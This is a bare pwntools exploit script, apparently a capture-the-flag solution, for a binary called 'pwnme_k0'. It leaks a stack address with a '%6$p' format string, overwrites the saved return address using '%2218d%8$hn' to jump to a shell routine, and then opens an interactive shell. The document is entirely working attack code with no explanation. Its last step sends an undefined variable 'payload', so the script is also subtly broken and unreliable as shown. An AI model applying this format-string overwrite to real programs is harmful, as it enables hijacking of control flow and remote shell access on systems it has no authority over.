from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pwnme_k0"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

username = "%6$p"
password = "bbbb"
p.sendlineafter("Input your username(max lenth:20): \n",username)
p.sendlineafter("Input your password(max lenth:20): \n",password)
p.sendlineafter(">","1")
gdb.attach(p,"b *0x400B28")

retaddr = int(p.recvuntil("\n",drop=True),16)-0x38
log.success("retaddr is -> " + hex(retaddr))
sh_addr = 0x4008AA

p.recv()
p.sendline("2")
p.recv()
p.sendline(p64(retaddr))
p.recv()
p.sendline("%2218d%8$hn")
p.recv()
p.sendline("1")
p.recv()
p.sendline(payload)

p.interactive()
